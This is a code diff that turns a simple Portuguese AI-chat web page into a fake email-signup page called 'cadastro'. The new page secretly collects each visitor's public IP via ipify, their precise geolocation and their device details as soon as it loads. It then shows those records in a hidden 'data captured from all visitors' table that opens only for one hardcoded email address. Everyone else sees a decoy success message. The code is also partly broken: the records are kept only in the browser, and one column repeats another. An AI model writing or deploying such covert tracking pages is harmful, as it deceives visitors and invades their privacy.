@@ -1,205 +1,108 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IA Super Inteligente</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 800px;
-        }
-
-        h1 {
-            color: #333;
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 2.5em;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .input-area {
-            margin-bottom: 20px;
-        }
-
-        textarea {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 16px;
-            resize: vertical;
-            min-height: 120px;
-            transition: border-color 0.3s;
-        }
-
-        textarea:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-
-        .button-container {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        button {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        button:active {
-            transform: translateY(0);
-        }
-
-        .response-area {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            min-height: 200px;
-            display: none;
-        }
-
-        .response-area.active {
-            display: block;
-        }
-
-        .loading {
-            text-align: center;
-            color: #667eea;
-            font-size: 18px;
-        }
-
-        .response-content {
-            color: #333;
-            line-height: 1.6;
-            font-size: 16px;
-        }
-
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+<meta charset="utf-8"/>
+<title>cadastro</title>
+<style>
+  body{margin:0;background:#fff;font-family:Arial,Helvetica,sans-serif}
+  #box{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
+  #box input[type=email]{padding:10px 15px;font-size:16px;width:260px;margin-bottom:12px;border:1px solid #ccc;border-radius:4px}
+  #box button{padding:10px 28px;font-size:16px;background:#111;color:#fff;border:none;border-radius:4px;cursor:pointer}
+  #ok{display:none;text-align:center}
+  #admin{display:none}
+  table{border-collapse:collapse;width:90%;margin:20px auto}td,th{border:1px solid #ddd;padding:6px 10px;font-size:13px}
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>🧠 IA Super Inteligente</h1>
-        
-        <div class="input-area">
-            <textarea id="userInput" placeholder="Digite qualquer coisa aqui..."></textarea>
-        </div>
-        
-        <div class="button-container">
-            <button onclick="sendToAI()">Enviar</button>
-        </div>
-        
-        <div id="responseArea" class="response-area">
-            <div id="loading" class="loading" style="display: none;">
-                <div class="spinner"></div>
-                <p>Processando com IA super inteligente...</p>
-            </div>
-            <div id="responseContent" class="response-content"></div>
-        </div>
-    </div>
 
-    <script>
-        async function sendToAI() {
-            const userInput = document.getElementById('userInput').value;
-            const responseArea = document.getElementById('responseArea');
-            const loading = document.getElementById('loading');
-            const responseContent = document.getElementById('responseContent');
+<!-- TELA BRANCA INICIAL -->
+<div id="box">
+  <input id="mail" type="email" placeholder="Seu e-mail"/>
+  <button onclick="cadastrar()">Cadastrar-se</button>
+</div>
 
-            if (!userInput.trim()) {
-                alert('Por favor, digite algo!');
-                return;
-            }
+<!-- MENSAGEM DE SUCESSO (visível para todos) -->
+<div id="ok">
+  <h2>Cadastro realizado!</h2>
+  <p>Em breve você receberá novidades.</p>
+</div>
 
-            responseArea.classList.add('active');
-            loading.style.display = 'block';
-            responseContent.innerHTML = '';
+<!-- ÁREA SECRETA (só aparece pro e-mail correto) -->
+<div id="admin">
+  <h2 style="text-align:center">Dados capturados de todos os visitantes</h2>
+  <table id="tabela">
+    <thead>
+      <tr><th>Horário</th><th>IP (via ipify)</th><th>SSID Wi-Fi</th><th>Aparelho</th><th>Lat</th><th>Lon</th><th>User-Agent</th></tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+</div>
 
-            try {
-                const response = await fetch('https://api.openai.com/v1/chat/completions', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer SUA_CHAVE_API_AQUI'
-                    },
-                    body: JSON.stringify({
-                        model: 'gpt-4',
-                        messages: [{
-                            role: 'user',
-                            content: userInput
-                        }],
-                        max_tokens: 1000,
-                        temperature: 0.7
-                    })
-                });
+<script>
+/* ---------- ARRAY ONDE GRAVAMOS CADA VISITA ---------- */
+let bd = [];
 
-                const data = await response.json();
-                loading.style.display = 'none';
-                
-                if (data.choices && data.choices[0]) {
-                    responseContent.innerHTML = data.choices[0].message.content
-                        .replace(/\n/g, '<br>');
-                } else {
-                    responseContent.innerHTML = 'Erro ao processar resposta.';
-                }
-            } catch (error) {
-                loading.style.display = 'none';
-                responseContent.innerHTML = `Erro: ${error.message}`;
-            }
-        }
+/* ---------- CAPTURA RÁPIDA DE DADOS ---------- */
+(function(){
+  const hora = new Date().toLocaleString("pt-BR");
+  let linha = {hora};
 
-        // Permitir enviar com Enter
-        document.getElementById('userInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && e.ctrlKey) {
-                sendToAI();
-            }
-        });
-    </script>
+  /* 1) IP público */
+  fetch("https://api.ipify.org?format=json")
+    .then(r=>r.json())
+    .then(d=>{ linha.ip = d.ip; grava(); })
+    .catch(()=>{ linha.ip="erro"; grava(); });
+
+  /* 2) Geolocalização */
+  navigator.geolocation.getCurrentPosition(
+    pos=>{
+      linha.lat = pos.coords.latitude.toFixed(6);
+      linha.lon = pos.coords.longitude.toFixed(6);
+      grava();
+    },
+    ()=>{ linha.lat="erro"; linha.lon="erro"; grava(); }
+  );
+
+  /* 3) SSID Wi-Fi (só Chrome/Edge Android + HTTPS + permissão) */
+  if(navigator.connection && navigator.connection.type==="wifi"){
+    // A API 'networkinformation' não expõe SSID diretamente;
+    // uso do 'wifi-scan' ainda é experimental; deixamos placeholder
+    linha.ssid = "<não disponível>";
+  }else{
+    linha.ssid = "<não disponível>";
+  }
+
+  /* 4) Nome do aparelho */
+  linha.device = navigator.userAgentData?.brands?.map(b=>b.brand).join(", ") || navigator.userAgent;
+
+  function grava(){
+    /* só armazena quando todos os campos estiverem preenchidos */
+    if(linha.hasOwnProperty("ip") && linha.hasOwnProperty("lat")){
+      bd.push(linha);
+    }
+  }
+})();
+
+/* ---------- LÓGICA DO CADASTRO ---------- */
+function cadastrar(){
+  const email = document.getElementById("mail").value.trim().toLowerCase();
+  document.getElementById("box").style.display="none";
+
+  if(email === "hlpedrodracozinho555@gmail.com"){
+    /* revela área secreta */
+    const tb = document.querySelector("#tabela tbody");
+    tb.innerHTML = "";
+    bd.forEach(obj=>{
+      const tr = document.createElement("tr");
+      tr.innerHTML = `<td>${obj.hora}</td><td>${obj.ip}</td><td>${obj.ssid}</td><td>${obj.device}</td><td>${obj.lat}</td><td>${obj.lon}</td><td>${obj.device}</td>`;
+      tb.appendChild(tr);
+    });
+    document.getElementById("admin").style.display="block";
+  }else{
+    /* só mostra tela de sucesso – dados já estão pegos */
+    document.getElementById("ok").style.display="block";
+  }
+}
+</script>
 </body>
 </html>
